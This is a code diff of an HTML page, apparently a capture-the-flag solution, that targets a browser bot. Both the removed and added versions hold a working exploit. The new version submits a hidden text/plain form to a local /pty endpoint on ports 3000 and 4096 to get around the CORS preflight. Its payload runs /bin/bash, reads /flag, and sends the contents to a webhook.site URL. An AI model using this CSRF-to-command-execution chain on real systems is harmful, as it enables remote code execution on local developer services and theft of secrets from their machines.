@@ -4,33 +4,36 @@
     <script>
         const WEBHOOK = 'https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4';
         
-        // 1. 调试信号：确认 Bot 已经访问了页面
-        fetch(`${WEBHOOK}?status=bot_arrived`);
+        // 信号确认
+        fetch(`${WEBHOOK}?status=attempting_form_csrf`);
 
-        async function exploit(port) {
-            const url = `http://127.0.0.1:${port}/pty`;
-            // 命令：读取 flag 并通过 fetch 发出
+        function sendCommand(port) {
+            // 构造要执行的命令
             const cmd = `node -e "fetch('${WEBHOOK}?port=${port}&flag=' + encodeURIComponent(require('fs').readFileSync('/flag', 'utf8')))"`;
+            
+            const payload = JSON.stringify({
+                command: '/bin/bash',
+                args: ['-c', cmd]
+            });
 
-            try {
-                // 使用 no-cors 模式，虽然无法获取响应，但请求能发出去
-                await fetch(url, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({
-                        command: '/bin/bash',
-                        args: ['-c', cmd]
-                    })
-                });
-                fetch(`${WEBHOOK}?status=sent_to_${port}`);
-            } catch (e) {
-                fetch(`${WEBHOOK}?status=error_${port}_${e.message}`);
-            }
+            // 创建一个隐藏的 form
+            const form = document.createElement('form');
+            form.action = `http://127.0.0.1:${port}/pty`;
+            form.method = 'POST';
+            form.enctype = 'text/plain'; // 使用 text/plain 绕过复杂请求的预检
+
+            const input = document.createElement('input');
+            input.name = payload; // 将整个 JSON 作为键名，后端如果解析不严会当做 body 处理
+            input.value = "";
+
+            form.appendChild(input);
+            document.body.appendChild(form);
+            form.submit();
         }
 
-        // 尝试常见的两个端口
-        exploit(3000);
-        exploit(4096);
+        // 同时尝试两个可能端口
+        setTimeout(() => sendCommand(4096), 1000);
+        setTimeout(() => sendCommand(3000), 2000);
     </script>
 </body>
 </html>
